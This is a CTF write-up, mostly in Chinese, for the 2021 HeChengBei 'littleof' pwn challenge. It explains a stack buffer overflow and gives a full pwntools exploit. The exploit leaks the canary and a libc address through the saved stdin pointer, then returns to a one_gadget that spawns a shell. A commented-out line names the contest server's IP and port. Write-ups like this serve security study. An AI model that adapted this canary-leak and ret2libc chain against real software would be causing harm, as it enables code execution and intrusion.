# HeChengBei 2021 littleof

> 2021 “鹤城杯”河南·鹤壁CTF网络安全挑战赛 初赛 pwn
>
> challenge name: littleof
>
> file: littleof, libc-2.27.so
>
> ld227-3ubuntu1.so and .i64 with comments provided  可以不用看了，程序不长
>
> writeup writer: hexhex16@outlook.com    https://github.com/kokifish

程序存在明显栈溢出，移除长度很长，一次littleof的执行可以溢出两次，其中第一次溢出之后会输出一次，需要解决的主要问题就是泄露canary，libc基址(anti-ASLR)，没有开启PIE，可以直接rop到littleof再rop一次

主要过程：

1. littleof第一次执行：覆盖到刚好到canary，printf的时候就会输出canary值。第二次read就用泄露的canary覆盖，return addr填littleof的地址。后面再执行时canary不会改变，程序也没开启PIE
2. littleof第二次执行：第一次read时覆盖满buf，泄露stdin上的首地址，这个地址在libc上，与vmmap输出的libc基址偏移量不变，故可以计算出libc基址。第二次read时就覆盖canary，return addr填onegadget

# IDA Analysis

基本上什么都没做，就到主要逻辑：

```cpp
unsigned __int64 littleof()
{
  char buf[8]; // [rsp+10h] [rbp-50h] BYREF
  FILE *v2; // [rsp+18h] [rbp-48h]
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v2 = stdin; // 注意这里存了stdin 可以用于泄露libc基址
  puts("Do you know how to do buffer overflow?");
  read(0, buf, 0x100uLL);
  printf("%s. Try harder!", buf);
  read(0, buf, 0x100uLL);
  puts("I hope you win");
  return __readfsqword(0x28u) ^ v3;
}
```

# Onegadget

```bash
one_gadget libc-2.27.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)  # 解题时随便选的选了这个
constraints:
  [rsp+0x70] == NULL
```





# Exploit

```bash
from pwn import *

context.log_level = 'debug'
libc = ELF('./libc-2.27.so')
sh = process(["./ld227-3ubuntu1.so", "./littleof"], env={"LD_PRELOAD": "./libc-2.27.so"})
# sh = remote("182.116.62.85", 27056)
# === Step-1: leak canary
payload = b"deafbeef".ljust(0x48, b'a')
sh.sendlineafter("overflow?", payload)
data = sh.recvuntil(payload)
data = sh.recv()
canary = u64(data[:8]) - 0xa  # 注意这里的 - 0xa
rbp = u64(data[8:16])  # 实际上这里的rbp并不影响
print("canary==>", hex(canary))
payload = b"deafbeef".ljust(0x48, b'a') + p64(canary) + p64(rbp) + p64(0x00000000004006E3)

sh.sendline(payload)

# === Step-2: leak libc base addr, return to one_gadget
payload = b"xxxxxxxx"
sh.sendlineafter("overflow?", payload)
data = sh.recvuntil(payload)
data = sh.recv()
addr_leak = u64(data[:6].ljust(8, b'\0'))
print("data:", data, len(data))
print("addr_leak: ", type(addr_leak), hex(addr_leak))

libc.address = addr_leak - libc.sym['_IO_2_1_stdin_'] - 0xa
print("===>", hex(libc.address))
# one_gadget
payload = b"deafbeef".ljust(0x48, b'a') + p64(canary) + p64(rbp) + p64(libc.address + 0x10a41c)
sh.sendline(payload)
# gdb.attach(sh)  # gdb
sh.interactive()

```

